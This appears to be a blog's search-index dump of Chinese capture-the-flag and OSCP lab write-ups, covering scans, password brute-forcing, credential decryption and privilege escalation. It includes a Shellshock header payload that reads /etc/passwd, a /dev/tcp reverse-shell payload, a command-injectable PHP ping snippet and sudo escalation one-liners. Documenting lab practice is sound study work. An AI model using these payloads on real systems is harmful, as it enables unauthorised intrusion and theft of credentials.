|_http-title: Site doesn't have a title (text/html). 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR | Not valid before: 2017-07-01T15:03:30 |_Not valid after: 2018-07-01T15:03:30 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 476.09 ms 10.10.16.1 2 476.19 ms 10.129.85.115 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 77.50 seconds gobuster dir --url https://10.129.85.115/ -w /usr/share/wordlists/dirb/small.txt -e -k -r ","date":"2023-12-07","objectID":"/nineveh/:1:0","tags":["靶场"],"title":"nineveh","uri":"/nineveh/"},{"categories":["靶场"],"content":" \u003c?php print $_POST[‘ip’]; if (isset($_POST[‘submit’])){ $target = $_REQUEST[ ‘ip’ ]; echo ‘’; echo shell_exec( ‘ping -c 3 ’ . $target ); echo ‘’; } ?\u003e ","date":"2023-12-07","objectID":"/oscp%E9%9D%B6%E5%9C%BA/:0:0","tags":["靶场"],"title":"OSCP靶场","uri":"/oscp%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":" ┌──(root💀Chinchin)-[~/桌面/vpn] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.195.118 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 11:10 CST Nmap scan report for 192.168.195.118 Host is up (0.24s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 1337/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 f7af6cd12694dce51a221a644e1c34a9 (RSA) | 256 46d28dbd2f9eafcee2455ca612c0d919 (ECDSA) |_ 256 8d11edff7dc5a72499227fce2988b24a (ED25519) 3306/tcp open mysql MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1 | mysql-info: | Protocol: 10 | Version: 5.5.5-10.3.23-MariaDB-0+deb10u1 | Thread ID: 39 | Capabilities flags: 63486 | Some Capabilities: FoundRows, InteractiveClient, IgnoreSpaceBeforeParenthesis, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, Speaks41ProtocolNew, IgnoreSigpipes, SupportsLoadDataLocal, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults | Status: Autocommit | Salt: =|{v_UnKkY[=^@gdB\\)T |_ Auth Plugin Name: mysql_native_password No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/21%OT=1337%CT=1%CU=30941%PV=Y%DS=4%DC=T%G=Y%TM=64698 OS:BD4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%II=I%TS=A)OPS(O1 OS:=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW OS:7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R= OS:Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%R OS:D=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q OS:=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK= OS:9289%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 4 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1723/tcp) HOP RTT ADDRESS 1 259.85 ms 192.168.45.1 2 259.87 ms 192.168.45.254 3 261.28 ms 192.168.251.1 4 261.43 ms 192.168.195.118 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.99 seconds hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.195.118 爆破出mysql的密码root:prettywoman mysql -h 192.168.195.118 -u root -p prettywoman MariaDB [data]\u003e select * from fernet; +--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+ | cred | keyy | +--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+ | gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= | +--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+ 参考了一下资料，使用了fetnet模块进行加密，问问gpt解密脚本怎么写 from cryptography.fernet import Fernet # 加密后的密文和 key（这里只是示例，请替换为自己的实际值） encrypted_message = b'gAAAAABd7sR0...liMBiH07v8=' key = b'eJdYD9jHjJTZVVo...K0wE=' # 创建 Fernet 对象并使用 key 进行解密 f = Fernet(key) decrypted_message = f.decrypt(encrypted_message) # 打印解密后的明文 print(decrypted_message.decode()) 获得明文lucy:wJ9`“Lemdv9[FEw- ssh lucy@192.168.195.118 -p 1337 wJ9`\"Lemdv9[FEw- 提权，看看sudo -l lucy@pyexp:~$ sudo -l Matching Defaults entries for lucy on pyexp: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User lucy may run the following commands on pyexp: (root) NOPASSWD: /usr/bin/python2 /opt/exp.py lucy@pyexp:~$ cat /opt/exp.py uinput = raw_input('how are you?') exec(uinput) 终于遇到个能看懂的了 exec()函数会把参数作为python代码执行，通过raw_input()输入 import pty; pty.spawn (\"/bin/bash\") ","date":"2023-12-07","objectID":"/pyexp/:0:0","tags":["靶场"],"title":"pyexp","uri":"/pyexp/"},{"categories":["靶场"],"content":" ┌──(root💀Chinchin)-[~/桌面/htb] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.129.85.125 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 16:29 CST Nmap scan report for 10.129.85.125 Host is up (0.58s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-title: Did not follow redirect to https://10.129.85.125/ |_http-server-header: lighttpd/1.4.35 443/tcp open ssl/https? | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 |_ssl-date: TLS randomness does not represent time Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|specialized Running (JUST GUESSING): OpenBSD 4.X (93%), Comau embedded (92%) OS CPE: cpe:/o:openbsd:openbsd:4.0 Aggressive OS guesses: OpenBSD 4.0 (93%), Comau C4G robot control unit (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 797.66 ms 10.10.16.1 2 797.81 ms 10.129.85.125 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.72 seconds ","date":"2023-12-07","objectID":"/sense/:0:0","tags":["靶场"],"title":"SENSE","uri":"/sense/"},{"categories":["靶场"],"content":" GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。 ","date":"2023-12-07","objectID":"/shocker/:0:0","tags":["靶场"],"title":"shocker","uri":"/shocker/"},{"categories":["靶场"],"content":" nmap -vv -sV -sT -A 10.129.85.4 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 2222/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc= | 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/1%OT=80%CT=1%CU=31082%PV=Y%DS=2%DC=T%G=Y%TM=644F2A80 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)SEQ( OS:SP=105%GCD=1%ISR=108%TI=Z%II=I%TS=8)OPS(O1=M53AST11NW6%O2=M53AST11NW6%O3 OS:=M53ANNT11NW6%O4=M53AST11NW6%O5=M53AST11NW6%O6=M53AST11)WIN(W1=7120%W2=7 OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53ANNSNW OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Uptime guess: 0.601 days (since Sun Apr 30 20:31:11 2023) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 对默认端口进行了扫描，开放了80，22端口。 gobuster dir -u http://10.129.85.4/ -w /usr/share/wordlists/dirb/small.txt gobuster dir -u http://10.129.85.4/cgi-bin -w /usr/share/wordlists/dirb/small.txt -x sh,pl =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.85.4/cgi-bin [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: sh,pl [+] Timeout: 10s =============================================================== 2023/05/01 10:54:28 Starting gobuster in directory enumeration mode =============================================================== /user.sh (Status: 200) [Size: 118] Progress: 2877 / 2880 (99.90%) =============================================================== 2023/05/01 10:56:21 Finished =============================================================== 目录扫描的过程中发现存在/cgi-bin/目录，目录下有个user.sh，继续尝试看看是否存在shellshock漏洞 GET /cgi-bin/user.sh HTTP/1.1 Host: 10.129.85.4 User-Agent: () { :; }; echo; /bin/cat /etc/passwd Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache HTTP/1.1 200 OK Date: Mon, 01 May 2023 03:28:17 GMT Server: Apache/2.4.18 (Ubuntu) Connection: close Content-Type: text/x-sh Content-Length: 1567 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbi","date":"2023-12-07","objectID":"/shocker/:0:1","tags":["靶场"],"title":"shocker","uri":"/shocker/"},{"categories":["靶场"],"content":"该Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以(){开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。 ","date":"2023-12-07","objectID":"/shocker/:0:2","tags":["靶场"],"title":"shocker","uri":"/shocker/"},{"categories":["靶场"],"content":"将payload插入user-agent，cookie等请求头中，发送请求，发现服务端已经将payload作为bash命令执行了。下一步，我想到的是反弹目标的shell到msf上。 GET /cgi-bin/user.sh HTTP/1.1 Host: 10.129.85.4 User-Agent: () { :; }; echo;/bin/sh -i \u003e\u0026 /dev/tcp/10.10.16.9/1234 0\u003e\u00261 Content-Length: 299 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache nc -nlvp 1234 $ pwd /usr/lib/cgi-bin $ cd / $ ls bin boot dev etc home initrd.img lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var vmlinuz $ cd home $ ls shelly $ cd shelly $ pwd /home/shelly $ ls user.txt $ cat user.txt 30805fc5d34502c55ba370c803bd5628 到此，拿下shelly用户的flag。尝试进一步提权到root sudo -l sudo perl -e 'exec \"/bin/bash\";' whoami cd /root cat root.txt ","date":"2023-12-07","objectID":"/shocker/:0:3","tags":["靶场"],"title":"shocker","uri":"/shocker/"},{"categories":["靶场"],"content":" ┌──(root💀Chinchin)-[~/桌面/vpn] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.195.78 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 21:40 CST Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 21:40 (0:00:06 remaining) Nmap scan report for 192.168.195.78 Host is up (0.27s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 5b5543efafd03d0e63207af4ac416a45 (RSA) | 256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA) |_ 256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: So Simple |_http-server-header: Apache/2.4.41 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/18%OT=22%CT=1%CU=42083%PV=Y%DS=4%DC=T%G=Y%TM=64662AF OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=1 OS:06%GCD=1%ISR=10B%TI=Z%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT1 OS:1NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE OS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q= OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16 OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A5B4%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 4 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 8888/tcp) HOP RTT ADDRESS 1 273.41 ms 192.168.45.1 2 273.36 ms 192.168.45.254 3 ... 4 273.46 ms 192.168.195.78 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.87 seconds 目录探测中发现/wordpress目录，尝试用wpscan枚举账户名，爆破密码 wpscan --url http://192.168.195.78/wordpress/ --enumerate u ┌──(root💀Chinchin)-[~/桌面/vpn] └─# wpscan --url http://192.168.195.78/wordpress/ --username admin --wordlist /usr/share/wordlists/rockyou.txt Scan Aborted: invalid option: --username Did you mean? usernames ┌──(root💀Chinchin)-[~/桌面/vpn] └─# wpscan --url http://192.168.195.78/wordpress/ --usernames admin --wordlist /usr/share/wordlists/rockyou.txt --threads 50 Scan Aborted: invalid option: --wordlist ┌──(root💀Chinchin)-[~/桌面/vpn] └─# wpscan --url http://192.168.195.78/wordpress/ --wordlist /usr/share/wordlists/rockyou.txt --usernames admin --threads 50 Scan Aborted: invalid option: --wordlist ┌──(root💀Chinchin)-[~/桌面/vpn] └─# wpscan --url http://192.168.195.78/wordpress/ /usr/share/wordlists/rockyou.txt --usernames admin --threads 50 1 ⨯ Scan Aborted: invalid option: --threads ┌──(root💀Chinchin)-[~/桌面/vpn] └─# wpscan --url http://192.168.195.78/wordpress/ /usr/share/wordlists/rockyou.txt --usernames admin 1 ⨯ _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://192.168.195.78/wordpress/ [192.168.195.78] [+] Started: Thu May 18 21:59:21 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://192.168.195.78/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_","date":"2023-12-07","objectID":"/sosimple/:0:0","tags":["靶场"],"title":"SoSimple","uri":"/sosimple/"},{"categories":["靶场"],"content":" ┌──(root㉿kali)-[~] └─# nmap -sV -sS -A --min-rate 5000 -p- 192.168.192.88 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 14:18 CST Nmap scan report for 192.168.192.88 Host is up (0.21s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9cfe0b8b8d15e7727e3c23e58655512d (RSA) | 256 feebef5d40e706679b6367f8d97ed3e2 (ECDSA) |_ 256 3583682c338bb46c2421200d52edcd16 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) | http-robots.txt: 1 disallowed entry |_/wp-admin/ |_http-title: Did not follow redirect to http://sunset-midnight/ 3306/tcp open mysql MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1 | mysql-info: | Protocol: 10 | Version: 5.5.5-10.3.22-MariaDB-0+deb10u1 | Thread ID: 15 | Capabilities flags: 63486 | Some Capabilities: Speaks41ProtocolNew, Support41Auth, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSigpipes, FoundRows, ODBCClient, InteractiveClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsCompression, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults | Status: Autocommit | Salt: \\~*P8bg`*P3OqkEU\\NS5 |_ Auth Plugin Name: mysql_native_password No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/26%OT=22%CT=1%CU=34273%PV=Y%DS=4%DC=T%G=Y%TM=64704F8 OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%II=I%TS=A)SEQ(SP=1 OS:06%GCD=1%ISR=108%TI=Z%TS=1)OPS(O1=M0ST11NW7%O2=M0ST11NW7%O3=M0NNT11NW7%O OS:4=M0ST11NW7%O5=M0ST11NW7%O6=M0ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W OS:5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M0NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z% OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G% OS:RID=G%RIPCK=G%RUCK=D4AC%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 4 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 554/tcp) HOP RTT ADDRESS 1 205.79 ms 192.168.45.1 2 205.89 ms 192.168.45.254 3 205.99 ms 192.168.251.1 4 206.18 ms 192.168.192.88 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.99 seconds wpscan --url http://sunset-midnight/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt ","date":"2023-12-07","objectID":"/sunsetmidnight/:0:0","tags":["靶场"],"title":"SunsetMidnight","uri":"/sunsetmidnight/"},{"categories":["靶场"],"content":"爆破没有得到结果，访问robots.txt User-agent: * Disallow: /wp-admin/ Allow: /wp-admin/admin-ajax.php ","date":"2023-12-07","objectID":"/sunsetmidnight/:1:0","tags":["靶场"],"title":"SunsetMidnight","uri":"/sunsetmidnight/"},{"categories":["靶场"],"content":"访问/wp-admin，查看源代码发现了一些ajax的接口 \u003cscript\u003e var spAjax = {\"url\":\"http:\\/\\/sunset-midnight\\/wp-admin\\/admin-ajax.php\"}; \u003c/script\u003e \u003cscript src='http://sunset-midnight/wp-content/plugins/simply-poll-master/script/simplypoll.js?ver=1.4'\u003e\u003c/script\u003e \u003cscript\u003e var _zxcvbnSettings = {\"src\":\"http:\\/\\/sunset-midnight\\/wp-includes\\/js\\/zxcvbn.min.js\"}; \u003c/script\u003e \u003cscript src='http://sunset-midnight/wp-includes/js/zxcvbn-async.min.js?ver=1.0'\u003e\u003c/script\u003e \u003cscript\u003e var pwsL10n = {\"unknown\":\"Password strength unknown\",\"short\":\"Very weak\",\"bad\":\"Weak\",\"good\":\"Medium\",\"strong\":\"Strong\",\"mismatch\":\"Mismatch\"}; \u003c/script\u003e \u003cscript src='http://sunset-midnight/wp-admin/js/password-strength-meter.min.js?ver=5.4.2'\u003e\u003c/script\u003e \u003cscript src='http://sunset-midnight/wp-includes/js/underscore.min.js?ver=1.8.3'\u003e\u003c/script\u003e \u003cscript\u003e var _wpUtilSettings = {\"ajax\":{\"url\":\"\\/wp-admin\\/admin-ajax.php\"}}; \u003c/script\u003e \u003cscript src='http://sunset-midnight/wp-includes/js/wp-util.min.js?ver=5.4.2'\u003e\u003c/script\u003e \u003cscript\u003e var userProfileL10n = {\"warn\":\"Your new password has not been saved.\",\"warnWeak\":\"Confirm use of weak password\",\"show\":\"Show\",\"hide\":\"Hide\",\"cancel\":\"Cancel\",\"ariaShow\":\"Show password\",\"ariaHide\":\"Hide password\"}; \u003c/script\u003e \u003cscript src='http://sunset-midnight/wp-admin/js/user-profile.min.js?ver=5.4.2'\u003e\u003c/script\u003e \u003cdiv class=\"clear\"\u003e\u003c/div\u003e \u003c/body\u003e \u003c/html\u003e 尝试构造了请求，但是没有什么收获。看了下walkthrough,发现走的路线不正确，原本想构造接口，看看有没有提供有用信息的接口，但是action参数不管传啥都返回0 ","date":"2023-12-07","objectID":"/sunsetmidnight/:2:0","tags":["靶场"],"title":"SunsetMidnight","uri":"/sunsetmidnight/"},{"categories":null,"content":"+++ title = ’test.md’ date = ‘2023-12-07T16:08:29+08:00’ draft = true +++ 测试 测试测试测试测试测试 ","date":"2023-12-07","objectID":"/test/:0:0","tags":null,"title":"test","uri":"/test/"},{"categories":["靶场"],"content":"将靶机设置为桥接模式，和其他机器处于一个局域网里。arp-scan -l查看局域网里其他主机，发现VMWARE的描述，确定靶机的IP地址 探测靶机开放的端口，对端口上的服务进行识别（goby会更方便） 80端口的网站是wordpress框架搭建的，用dirb爆破下目录 /ipdata路径下有个.cap文件，wireshark打开，检索到登录的数据包 用账户密码登录到后台，翻看有啥插件可以利用 利用file manager查看根目录下的配置文件 拿到了数据库的配置文件，数据库的连接用户名和密码 猜想，他的数据库用户名和密码有可能重复使用，作为SSH服务的账户密码，尝试登录 登陆成功，但是没有权限访问/root目录 sudo -l查看所有可以用root权限运行的命令 结合网上教程，新建一个文件， 赋予/root目录所有用户可读写权限 sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z 1 -Z root -Z参数指定使用root用户执行，-z参数指定要执行的命令从文件1中读取 成功访问/root/flag.txt ","date":"2023-12-07","objectID":"/webdeveloper%E9%9D%B6%E6%9C%BA/:0:0","tags":["靶场"],"title":"webdeveloper靶机","uri":"/webdeveloper%E9%9D%B6%E6%9C%BA/"},{"categories":["靶场"],"content":" bob@wheels:~$ ./linpeas.sh ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ 